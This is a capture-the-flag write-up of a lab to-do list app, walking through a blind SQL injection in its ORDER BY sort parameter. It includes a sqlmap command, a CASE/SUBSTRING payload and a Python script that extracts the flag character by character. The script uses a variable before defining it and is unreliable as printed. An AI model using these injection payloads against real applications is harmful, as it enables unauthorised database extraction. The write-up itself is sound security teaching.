# Prioritise

## Description

We have this new to-do list application, where we order our tasking based on priority! Is it really all that secure, though...?

## Solution

The first thing I made was accessing the website, looks like a simple to-do list application. Let's try to add a task and analyze what's happening through burpsuite. I added a task called "test" and intercepted the request. The request was a POST request to the endpoint `/new` with the following parameters:

```
title=test&date=07%2F01%2F2026
```

Yes, the task also has a date parameter, which is interesting. Let's try to see if we can manipulate the priority of the task. I changed the title to "test" and the date to "07/01/2026" and sent the request. The response was a 500 Internal Server Error. This indicates that the server is not handling the input correctly, which could be a potential vulnerability.

Well let's test more of this website functionality. Besides adding tasks, we can mark them as done (I thought, since there was a checkbox right next to the task, but apparently, it doesn't do anything), delete them and sort them by: Title, Done and Due Date.

When I was selecting the challenge, a short description said: "In this challenge you will explore some less common SQL Injection techniques." my first thought would be that this vulnerability is related to the `/new` endpoint, but after some tries, it didn't seem to be the case. After some time, I realized that the sorting functionality could be possibly exploitable. This endpoint is a GET request to `/?order=tile` (or `/?order=done` or `/?order=date`). Before trying anything, let's see what `sqlmap` has to say about this endpoint. I ran the following command:

```
sqlmap -u "http://<IP_ADDRESS>/?order=title" --batch --dbs
```

But we didn't get any results. So, let's try this manually, after some tries (most of them were basic SQLi patterns I learned from previous challenges) I tried something way easier, some real SQL that we learned in the Databases course. Let's look again at the endpoint name, 'order' the most likely is that the query is using the ORDER BY clause, so we can try to add a simple 'ASC' or 'DESC' and see what happens. After trying this, I saw the tasks changing their order like expected, so what I'm thinking here is that the query is something like this:

```
SELECT * FROM <table_name> ORDER BY <input>
```

I tried some UNION SELECT statements, that's what I thought the challenge was about, but it didn't work. After some time, I realized that it would be possible to use the CASE statement to manipulate queries based on specific conditions. This could be a Blind SQL Injection vulnerability, where we can use the CASE statement to try a specific character (in this case we are trying to extract a flag, therefore the use of alphanumeric characters and the SUBSTRING function). This payload sounds very complex but the idea is pretty simple:

```
order=(case when (select (substring(flag,1,1)) from flag)= 'a' then title else date end) ASC
```

We try to order the tasks by title if the first character of the flag is = 'a', else we order by date. Since the answer format in this challenge is something like '\*\*\*\*{...}' we can assume it starts with the word 'flag' (in most of TryHackMe challenges it starts with 'THM', which I tried for a long time until I realized it had 4 chars instead of 3 :p). If we use this payload the first we see the tasks getting ordered by date as expected (I deleted all tasks, and kept only 2 of them with names 'a' and 'b' and dates: 2026-07-23 and 2026-06-30 respectively) this means that the first character of the flag is not 'a'. Next I tried to use the character 'f', which showed that my logic worked, since now we got the tasks ordered by title.

Now that we concluded that this challenge depends on Blind SQL Injection, there are 2 variables that we should change, the position that we are testing in the SUBSTRING function and the character that we are testing. I reused a script of mine that I used for a Blind SQL Injection challenge.The final script looks like this:

```
import requests
import string

url = ''
flag = ''
cnt = 1
chars = string.ascii_letters + string.digits + "{}"
hit = req.get(url + "title").text


while flag.endswith("}") == False:
    for c in chars:
        payload = f"(CASE WHEN (SELECT SUBSTRING(flag, {cnt}, 1) FROM flag) = '{c}' THEN title ELSE date END)"
        try:
            req = requests.get(url + payload)
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")
            continue
        if req.text == hit:
            flag += c
            print(f"[+] curr : {flag}")
            cnt += 1
            break



print(f"flag: {flag}")
```

This gave us the flag. Yes, this script could be optimized but since I was testing it and it worked, I found no need to change it.

Thank you for your attention and I hope you enjoyed this write-up. Hopefully you learnt something new.
